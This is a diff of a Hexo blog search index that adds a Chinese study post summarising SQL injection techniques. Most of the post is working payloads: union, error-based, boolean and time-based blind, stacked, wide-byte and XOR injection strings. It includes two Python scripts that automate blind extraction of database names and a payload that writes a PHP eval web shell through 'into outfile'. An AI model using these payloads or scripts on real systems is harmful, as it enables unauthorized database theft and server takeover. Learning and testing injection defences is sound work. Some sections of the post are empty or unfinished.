@@ -1,20 +1,337 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/2024/03/20/hello-world/"/>
-      <url>/2024/03/20/hello-world/</url>
-      
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-  
-  
+<search>
+  <entry>
+    <title>SQL注入总结(完善中...)</title>
+    <url>/2024/03/22/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%AE%8C%E5%96%84%E4%B8%AD/</url>
+    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="https://image.3001.net/images/20231104/1699110280_65465d886a979bd8a3689.png!small" alt="1699110280_65465d886a979bd8a3689.png!small"></p>
+<p>其实sql注入从来不只是具有单一性的，从操作来看，很多时候都是结合起来使用。所以上面这张图只是对sql注入进行一个总结，我选择把联合注入放在前面，间接性的结合其它比如说数据类型注入等来作为开头</p>
+<h2 id="一-联合注入（有回显）"><a href="#一-联合注入（有回显）" class="headerlink" title="一.联合注入（有回显）"></a>一.联合注入（有回显）</h2><p>在进行注入之前，判断注入数据类型</p>
+<p><strong>数字型：</strong></p>
+<pre><code class="highlight plaintext">id=1 and 1=1
+id=1 and 1=2</code></pre>
+
+<p>在sql内部语句就会转换成：</p>
+<pre><code class="highlight plaintext">select * from table_name where id=1 and 1=1
+select * from table_name where id=1 and 1=2</code></pre>
+
+<p>可见，第一个永远为真，回显肯定正常；第二个肯定不对，回显就会错误，根据这个来判断是否存在数字型注入</p>
+<p><strong>字符型：</strong></p>
+<p>通常的使用单引号去检测</p>
+<pre><code class="highlight plaintext">id=1&#x27;</code></pre>
+
+<p>sql语句会是这样的：</p>
+<pre><code class="highlight plaintext">select * from users where username=&#x27;1&#x27;&#x27;</code></pre>
+
+<p>这个时候最后的单引号会落单，多半会有回显提示你的语句存在语法错误，我们只需要</p>
+<pre><code class="highlight plaintext">id=1&#x27;#</code></pre>
+
+<p>加一个注释符号，把后面的单引号注释掉，这个时候如果页面有正常回显，那么说明存在字符型注入；这也就是万能密码的原理**’ or 1&#x3D;1#**；也就是说为了留一个心眼，在写sql查询时，还是要将密码和用户名分开查询，构成两个语句。</p>
+<p><strong>搜索型：</strong></p>
+<p>一般而言搜索型注入对应的语句是like语句，会像这样：</p>
+<pre><code class="highlight plaintext">select * from table where username like &#x27;%$content%&#x27;</code></pre>
+
+<p>一般而言我们在搜索框会这样输入：</p>
+<pre><code class="highlight plaintext">quar%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</code></pre>
+
+<p>我们现在来看一下sql语句变成了什么：</p>
+<pre><code class="highlight plaintext">select * from table where username like &#x27;%quar%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;%&#x27;</code></pre>
+
+<p>可以看到每一个都是以’%  %’的闭合方式，所以这条sql语句就会通过</p>
+<p>不难看出，不管注入的数据类型是啥，我们都是要去想办法通过注入点<strong>闭合</strong>这条sql语句</p>
+<p>判断好注入类型以后我们就可以进行联合注入了，接下来就是一些常规步骤（以字符型注入为例）</p>
+<h3 id="1-判断字段数（列数）"><a href="#1-判断字段数（列数）" class="headerlink" title="1.判断字段数（列数）"></a>1.判断字段数（列数）</h3><p><strong>union有一个十分严格的约束条件，必选保证字段数一致，即两个查询结果有相同的列数，因此我们要对字段数进行判断</strong></p>
+<pre><code class="highlight plaintext">1&#x27; order by 2#</code></pre>
+
+<p>123….依次去试，错误的列数不会有正常回显，当有错误回显后-1既是列数</p>
+<h3 id="2-判断回显点"><a href="#2-判断回显点" class="headerlink" title="2.判断回显点"></a>2.判断回显点</h3><pre><code class="highlight plaintext">1&#x27; union select 1,2#</code></pre>
+
+<p>根据回显，判断哪几列字段会输出有效信息，同时验证我们order by语句是否正确</p>
+<h3 id="3-数据库名"><a href="#3-数据库名" class="headerlink" title="3.数据库名"></a>3.数据库名</h3><p>以下都会用到group_concat()进行字符拼接</p>
+<p>现在只需要将有回显的数字替换成这个函数即可</p>
+<pre><code class="highlight plaintext">1&#x27; union select 1,group_concat(schema_name) from information_schema.schemata#
+或
+1&#x27; union select 1,group_concat(table_name) from information_schema.tables where 
+table_schema=database()#</code></pre>
+
+<p><strong>如果你打开过MySQL数据库，你会发现自带几个数据库，而information_schema就是一个包含了关于 MySQL 服务器上所有其他数据库的元数据的一个库，schemata是里面的表，储存着各个数据库名信息</strong></p>
+<h3 id="4-表名"><a href="#4-表名" class="headerlink" title="4.表名"></a>4.表名</h3><pre><code class="highlight plaintext">1&#x27; union select 1,group_concat(table_name) from information_schema.tables where 
+table_schema=&#x27;数据库名&#x27;#</code></pre>
+
+<h3 id="5-字段名"><a href="#5-字段名" class="headerlink" title="5.字段名"></a>5.字段名</h3><pre><code class="highlight plaintext">1&#x27; union select 1,group_concat(column_name) from information_schema.columns where 
+table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;#</code></pre>
+
+<h3 id="6-字段信息"><a href="#6-字段信息" class="headerlink" title="6.字段信息"></a>6.字段信息</h3><pre><code class="highlight plaintext">1&#x27; union select 1,group_concat(字段1,字段2) from 表名#</code></pre>
+
+
+
+<h2 id="二-报错注入（有回显）"><a href="#二-报错注入（有回显）" class="headerlink" title="二.报错注入（有回显）"></a>二.报错注入（有回显）</h2><p>其机制是人为的制造错误条件，使得查询结果出现在错误信息中<strong>（页面上没有显示位但是有sql语句执行错误信息输出位）</strong>；一般在联合查询（有回显）受限且能返回错误信息的情况下使用；在mysql5.5之后，整形溢出才会报错</p>
+<p>报错注入原理：</p>
+<p><img src="C:\Users\23800\AppData\Roaming\Typora\typora-user-images\image-20240305193921603.png" alt="image-20240305193921603"></p>
+<p>在MySQL的官方文档中我们可以看到，无标志位的最大整形数据是2^64-1也就是18446744073709551615，当超过这个数值时就会发生整型溢出导致报错</p>
+<p><img src="C:\Users\23800\AppData\Roaming\Typora\typora-user-images\image-20240305194448175.png" alt="image-20240305194448175"></p>
+<p>在真实的注入环境中，我们可以用按位取反运算符号~</p>
+<p><img src="C:\Users\23800\AppData\Roaming\Typora\typora-user-images\image-20240305194628430.png" alt="image-20240305194628430"></p>
+<h3 id="1-主键重复"><a href="#1-主键重复" class="headerlink" title="1.主键重复"></a>1.主键重复</h3><p>这里会有三个函数count(*),group by,rand()造成重复</p>
+<pre><code class="highlight plaintext">select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</code></pre>
+
+<p><strong>count(*)：</strong>计算结果有多少行</p>
+<p>**floor(rand(0)<em>2))：**首先rand(0)产生0~1随机浮点数，</em>2则是0~2随机浮点数，floor()函数向下取整，所以整体随机生成0或1</p>
+<p><strong>group by：</strong>读取每一行数据，产生一个临时的表x</p>
+<pre><code class="highlight plaintext">select count(*) from 表名 group by NAME;</code></pre>
+
+<p>这个sql语句翻译过来就是</p>
+<p>原本的表：</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>NAME</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>aaa</td>
+</tr>
+<tr>
+<td>1</td>
+<td>bbb</td>
+</tr>
+<tr>
+<td>2</td>
+<td>aaa</td>
+</tr>
+</tbody></table>
+<p>临时产生的表：</p>
+<table>
+<thead>
+<tr>
+<th>KEY</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>aaa</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>bbb</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<p>然而，我们都知道，rand函数其实是一个伪随机，每次随机出来的数字都是一样的，所以floor(rand(0)*2)就会得到011011…的<strong>固定</strong>序列</p>
+<pre><code class="highlight plaintext">select count(*) from test group by floor(rand(0)*2)</code></pre>
+
+<p>所以第一次结果为0**(第一次计算)<strong>，查询虚表，</strong><em>发现没有该键值，则尝试插入该键值</em><strong>，再二次运算，将结果1</strong>(第二次计算)<strong>插入虚表；结果1</strong>(第三次计算)<strong>，查询有该键值，则插入；结果0</strong>(第四次计算)<strong>，</strong><em>查询没有该键值，则尝试插入该键值</em><strong>，进行二次运算结果为1</strong>(第五次计算)**，此时键值重复，则报错</p>
+<p><img src="C:\Users\23800\AppData\Roaming\Typora\typora-user-images\image-20240305205607603.png" alt="image-20240305205607603"></p>
+<p>数据库：</p>
+<pre><code class="highlight plaintext">&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2)) as x from information_schema.tables group by x) as a</code></pre>
+
+<p>表：</p>
+<pre><code class="highlight plaintext">&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2)) as x from information_schema.tables group by x) as a</code></pre>
+
+<p>字段：</p>
+<pre><code class="highlight plaintext">&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2)) as x from information_schema.tables group by x) as a</code></pre>
+
+<p>字段数据：</p>
+<pre><code class="highlight plaintext">&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2)) as x from information_schema.tables group by x) as a</code></pre>
+
+<p>这里的x，a是临时的表名</p>
+<h3 id="2-xpath语法错误"><a href="#2-xpath语法错误" class="headerlink" title="2.xpath语法错误"></a>2.xpath语法错误</h3><p>XML查询和修改的函数，extractvalue和updatexml；extractvalue负责在XML文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容</p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><pre><code class="highlight plaintext">EXTRACTVALUE(xml_document, xpath_string)
+xml_document:XML 文档的标识符(xml文档对象的名称)
+xpath_string:XPath 表达式(字符串)</code></pre>
+
+<p>如果 XPath 表达式格式错误，MySQL 会抛出一个错误，数据库会记录错误信息，并返回错误信息，而我们就可以把payload构造在XPath表达式中</p>
+<p>数据库：</p>
+<pre><code class="highlight plaintext">&#x27;and(select extractvalue(1,concat(0x7e,(select database()),0x7e)))#</code></pre>
+
+<p><strong>1：</strong>作为文档标识符，这里应该是占位的作用，理论上这里可以写入任何数据</p>
+<p><strong>0x7e：</strong>16进制的表示方法，这里是’~’，而这个符号在XPath 表达式中是一个非法字符，所以就会报错</p>
+<p>表：</p>
+<pre><code class="highlight plaintext">&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;),0x7e)))#</code></pre>
+
+<p>字段：</p>
+<pre><code class="highlight plaintext">&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;),0x7e)))#</code></pre>
+
+<p>字段数据：</p>
+<pre><code class="highlight plaintext">&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME),0x7e)))#</code></pre>
+
+
+
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><pre><code class="highlight plaintext">UPDATEXML(xml_document, xpath_string, new_value)
+xml_document：  XML 文档的标识符
+xpath_string ：用于指定要更新的节点
+new_value：新值</code></pre>
+
+<p>数据库：</p>
+<pre><code class="highlight plaintext">&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))#</code></pre>
+
+<p>表：</p>
+<pre><code class="highlight plaintext">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;数据库名&#x27;),0x7e))#</code></pre>
+
+<p>字段：</p>
+<pre><code class="highlight plaintext">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;表名&#x27;)),0x7e))#</code></pre>
+
+<p>字段数据：</p>
+<pre><code class="highlight plaintext">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))#</code></pre>
+
+
+
+<p>注意两个函数0x7e的位置，前者只是为了方便显示select的信息；后者中，两个都是非法字符，起占位的作用</p>
+<h2 id="三-布尔盲注"><a href="#三-布尔盲注" class="headerlink" title="三.布尔盲注"></a>三.布尔盲注</h2><p>通过改变输入并观察应用程序的输出（通常是页面显示的内容或错误消息）来确定数据库中的信息，用and和or来构造sql语句</p>
+<p>这里有三个函数length(),substr(),ascii()</p>
+<p><strong>length()：</strong>返回字符串的长度</p>
+<p><strong>substr()：</strong>有三个参数，第一个是要截取的字符串，第二个是从第几个字符开始截取，第三个是一次性截取多少个；例如，substr(hello,2,2)输出el</p>
+<p><strong>ascii()：</strong>返回字符的ASCII码（用于后续二分法进行猜测比较，确定字符）</p>
+<p>每一个阶段可分为，判断表，字段数量（count函数）；确定字符个数（length函数）；⼆分法逐字猜解（substr和ascii函数）</p>
+<p><strong>判断数据库字符个数</strong></p>
+<pre><code class="highlight plaintext">1&#x27; and length(database())=1 #</code></pre>
+
+<p>改变值，直至页面回显正常（这也就是为什么，在写脚本时，我们要进行抓包来判断注入成功时能返回什么信息）</p>
+<p><strong>判断数据库字符串每个字符</strong></p>
+<pre><code class="highlight plaintext">1&#x27; and ascii(substr(database(),n,1))&gt;97 # a
+1&#x27; and ascii(substr(database(),n,1))&lt;122 # z
+n从1依次增加，因为前面的字符已经通过二分法确定</code></pre>
+
+<p>通过观察页面来进行判断</p>
+<p><strong>判断表有几个</strong></p>
+<pre><code class="highlight plaintext">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;=1 #</code></pre>
+
+<p>1，2…..直至页面正常即可</p>
+<p><strong>判断表字符个数</strong></p>
+<pre><code class="highlight plaintext">1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1 #
+limit 0,1：限制第一个表，如果有第二个表limit 1,1</code></pre>
+
+<p>后续的字段同理</p>
+<h2 id="四-时间盲注"><a href="#四-时间盲注" class="headerlink" title="四.时间盲注"></a>四.时间盲注</h2><h3 id="1-sleep延时"><a href="#1-sleep延时" class="headerlink" title="1.sleep延时"></a>1.sleep延时</h3><p><strong>if()：</strong>IF(条件, 值1, 值2)，如果条件为真，则返回值1，否则返回值2</p>
+<p><strong>sleep(n)：</strong>延迟n秒后回显</p>
+<p>大体和布尔盲注一样：</p>
+<p><strong>判断数据库字符个数</strong></p>
+<pre><code class="highlight plaintext">1&#x27; and if(length(database())&gt;8,sleep(2),0) #</code></pre>
+
+<p><strong>判断数据库字符串每个字符</strong></p>
+<pre><code class="highlight plaintext">1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(2),0) #</code></pre>
+
+<p>后面同理了，只需用if与sleep函数组合起来</p>
+<p>这里的重点是，当sleep函数被过滤时，我们应该怎么办？事实上，我们的目的是达到延时的效果，以下几种方法均可</p>
+<h3 id="2-benchmark延时"><a href="#2-benchmark延时" class="headerlink" title="2.benchmark延时"></a>2.benchmark延时</h3><pre><code class="highlight plaintext">benchmark(t,exp)
+重复执行t次exp表达式
+benchmark( 5000000, md5( &#x27;test&#x27; ))以此达到延时效果</code></pre>
+
+
+
+<h3 id="3-笛卡尔积（叠加全排列）"><a href="#3-笛卡尔积（叠加全排列）" class="headerlink" title="3.笛卡尔积（叠加全排列）"></a>3.笛卡尔积（叠加全排列）</h3><p>对多个表做笛卡尔积连接，使之查询时间呈指数增长，增加系统执行sql语句的负荷，直到产生想要的时间延迟</p>
+<p><strong>笛卡尔积连接：</strong>数据库中的一种连接类型，它发生在两个表（或查询结果集）之间，不基于任何特定的条件。在这种连接中，第一个表的每一行与第二个表的每一行组合，形成一个新的结果集，其中包含了所有可能的行对组合</p>
+<p><img src="C:\Users\23800\AppData\Roaming\Typora\typora-user-images\image-20240307194908845.png" alt="image-20240307194908845"></p>
+<pre><code class="highlight plaintext">(select count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C)可以是同一张表</code></pre>
+
+
+
+<h3 id="4-GET-LOCK-加锁"><a href="#4-GET-LOCK-加锁" class="headerlink" title="4.GET_LOCK() 加锁"></a>4.GET_LOCK() 加锁</h3><pre><code class="highlight plaintext">get_lock(str,n)给str上锁，若成功返回1，失败返回0，并延时n秒
+release_lock(str)没有该str的锁返回NULL；释放成功返回 1，失败返回0</code></pre>
+
+<p>这个锁是应用程序级别的，在不同的mysql会话之间使用，<strong>不是锁具体某个表名或字段</strong>，它是一种独占锁，意味着哪个会话持有这个锁，其他会话尝试拿这个锁的时候都会失败</p>
+<p>当会话1 get_lock 后，未释放。会话2 不get_lock 同一个key，或者就不get_lock,依然可以对数据进行任何操作</p>
+<pre><code class="highlight plaintext">1&#x27; and if(ascii(substr(database(),1,1))=115,get_lock(1,2),1)#
+或
+1&#x27; and get_lock(substr(database(),1,1),2);</code></pre>
+
+<p><strong>使用条件：数据库必须是持久连接；所利用的是前一个连接对后一个连接的阻碍作用从而导致延时产生；php中使用mysql_pconnect()方法链接数据库的网站</strong></p>
+<h3 id="5-RLIKE-REGEXP正则匹配"><a href="#5-RLIKE-REGEXP正则匹配" class="headerlink" title="5.RLIKE REGEXP正则匹配"></a>5.RLIKE REGEXP正则匹配</h3><pre><code class="highlight plaintext">concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</code></pre>
+
+<p><strong>rpad(1,999999,’a’)：</strong>在字符1右边补a，直到长度为999999</p>
+<p><strong>(a.*)：</strong>点号 <code>.</code> 在正则表达式中表示任意字符；星号 <code>*</code> 表示前面的元素可以出现零次或多次；<code>.*</code> 匹配任意长度的任意字符序列</p>
+<p>然后通过<strong>rlike</strong>判断字符串是不是形如<strong>aaaaaab</strong>，事实上肯定不是，将返回0</p>
+<p>如果 RLIKE 匹配成功，查询可能会因为字符串的匹配而快速返回结果，而不成功则可能会因为数据库需要更多时间来处理这个复杂的匹配而产生延时</p>
+<h3 id="时间盲注的优缺点"><a href="#时间盲注的优缺点" class="headerlink" title="时间盲注的优缺点"></a>时间盲注的优缺点</h3><p>优点：对日志没有任何影响，日志没有记录，就加大了管理员发现的难度</p>
+<p>缺点：执行大量查询时，管理员也会意识到发生的事情；测试Web应用程序时，服务器负载和网络速度可能对响应时间产生巨大的影响，你需要增长时间来保证结果的准确性，但同时在合理的时间内测试应用程序又会需要减少时间，因此把握好度很重要</p>
+<h2 id="关于SQL盲注的效率分析"><a href="#关于SQL盲注的效率分析" class="headerlink" title="##关于SQL盲注的效率分析##"></a>##关于SQL盲注的效率分析##</h2><p>1.遍历法：</p>
+<pre><code class="highlight plaintext">def get_database_name(url,dictionary,zhurudian):
+    database_name = &quot;&quot;
+
+    for num in range(1,100):
+       print(num)
+       for i in dictionary:
+         data = &#123;&#x27;username&#x27;:&quot;admin&#x27; and substr((seLect(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27; #&quot;.format(num,i),
+         &#x27;password&#x27;:&#x27;123456&#x27;&#125;
+         response = requests.post(url = url, data = data)
+        
+         if zhurudian in response.text:
+            database_name += i
+            print(database_name)
+            break
+
+    return database_name</code></pre>
+
+<p>2.二分法：</p>
+<pre><code class="highlight plaintext">def get_database_name(url,dictionary,zhurudian):
+    database_name = &quot;&quot;
+
+    for num in range(1,100):
+       print(num)
+       min = 32
+       max = 126
+       mid = (min+max) // 2 #取整
+
+       while min &lt;= max:
+           data = &#123;&#x27;username&#x27;:&quot;admin&#x27; and ascii(substr((seLect(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1))&gt;&#x27;&#123;1&#125;&#x27; #&quot;.format(num,mid),
+           &#x27;password&#x27;:&#x27;123456&#x27;&#125;
+           response = requests.post(url = url, data = data)
+        
+           if zhurudian in response.text: #ascii码值比mid大
+             min = mid + 1
+           else:
+             max = mid
+           mid = (min+max) // 2
+           if min == max:
+              database_name += chr(mid)
+              print(database_name)
+              break
+            
+    return database_name</code></pre>
+
+<p>3.与运算</p>
+<pre><code class="highlight plaintext"></code></pre>
+
+
+
+<h2 id="五-堆叠注入"><a href="#五-堆叠注入" class="headerlink" title="五.堆叠注入"></a>五.堆叠注入</h2><p>即同时执行多条sql语句(增，删，改)，用<strong>；</strong>进行连接，我们发现联合查询可以结合两条语句，但是union只能进行查询操作</p>
+<p>但堆叠注入本身局限性比较大，只有遇到支持同时执行多条sql语句的数据库才可以使用；在MySQL中，只有当使用mysql_multi_query()函数才能使用，像mysqli_ query()是只支持执行一条的</p>
+<pre><code class="highlight plaintext">1&#x27;;select if(ascii(substr(user(),1,1))=114,sleep(3),1);#</code></pre>
+
+<p>可以看到这条语句是在堆叠注入的基础上结合了时间盲注，我在猜想当攻击对象过滤了and或者or此时应该就是堆叠注入的优势吧</p>
+<h2 id="六-宽字节注入"><a href="#六-宽字节注入" class="headerlink" title="六.宽字节注入"></a>六.宽字节注入</h2><p>敏感函数 &amp; 选项</p>
+<ul>
+<li><code>addslashes()</code>函数：返回在预定义字符之前添加反斜杠的字符串</li>
+<li><code>magic_quotes_gpc</code>选项：对 POST、GET、Cookie 传入的数据进行转义处理，在输入数据的特殊字符如 单引号、双引号、反斜线、NULL等字符前加入转义字符<code>\</code>，在高版本 PHP 中（&gt;&#x3D;5.4.0）已经弃用</li>
+<li><code>mysql_real_escape_string()</code>函数：函数转义 SQL 语句中使用的字符串中的特殊字符</li>
+<li><code>mysql_escape_string()</code>函数：和<code>mysql_real_escape_string()</code>函数基本一致，差别在于不接受连接参数，也不管当前字符集设定</li>
+</ul>
+<p>宽字节注入的本质是开发者设置<strong>数据库编码与 PHP 编码为不同的编码格式从而导致产生宽字节注入</strong>，例如当 Mysql 数据库使用 GBK 编码时，它会把两个字节的字符解析为一个汉字，而不是两个英文字符，这样，如果我们输入一些特殊的字符，就会形成 SQL 注入</p>
+<p>但是，如果我们输入<code>%df’</code>，它会变成<code>%df%5c%27</code>，这里，%df%5c是一个宽字节的GBK编码，它表示一个繁体字“運”</p>
+<p>因为 GBK 编码的第一个字节的范围是 129-254，而<code>%df</code>的十进制是 223，所以它属于 GBK 编码的第一个字节，而<code>%5c</code>的十进制是 92，它属于 GBK 编码的第二个字节的范围 64-254，所以，<code>%df%5c</code>被数据库解析为一个汉字，而不是两个英文字符</p>
+<p>（可以抓包来看是否设置gbk编码）</p>
+<p><img src="C:\Users\23800\AppData\Roaming\Typora\typora-user-images\image-20240309205103412.png" alt="image-20240309205103412"></p>
+<p>使用其他宽字节<br>不仅仅只是使用%df’ 进行宽字节绕过也可以使用其他的宽字节，只有满足字符串编码的要求<br>常见使用的宽字节就是%df,其实当我们输入第一个ascill大于128就可以，转换是将其转换成16进制，eg:129转换0x81,然后在前面加上%就是%81<br>GBK首字节对应0x81-0xfe(129-239),尾字节对应0x40-0xfe(64-126)(除了0x7f【128】)<br>比如一些 %df’ %81’ %82’ %de’ 等等（只有满足上面的要求就可以）</p>
+<p>数据库：</p>
+<pre><code class="highlight plaintext">1%df%27%20union%20select%201,database()%23</code></pre>
+
+
+
+<h2 id="七-二次注入"><a href="#七-二次注入" class="headerlink" title="七.二次注入"></a>七.二次注入</h2><h2 id="八-异或注入"><a href="#八-异或注入" class="headerlink" title="八.异或注入"></a>八.异或注入</h2><p>例如单引号被过滤时</p>
+<pre><code class="highlight plaintext">2^(if(ascii(mid(user(),1,1))&gt;0,0,1))</code></pre>
+
+<p>判断存在注入，2的二进制（10）xor 0的二进制（00）结果是10，所以还是2</p>
+<h2 id="九-sql写入木马"><a href="#九-sql写入木马" class="headerlink" title="九.sql写入木马"></a>九.sql写入木马</h2><pre><code class="highlight plaintext">payload:1,id=3 union select 1,&quot;&lt;?php @eval($_REQUEST[a])?&gt;&quot; into outfile &quot;绝对路径+任意写入php&quot;#</code></pre>
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>WEB</tag>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
 </search>
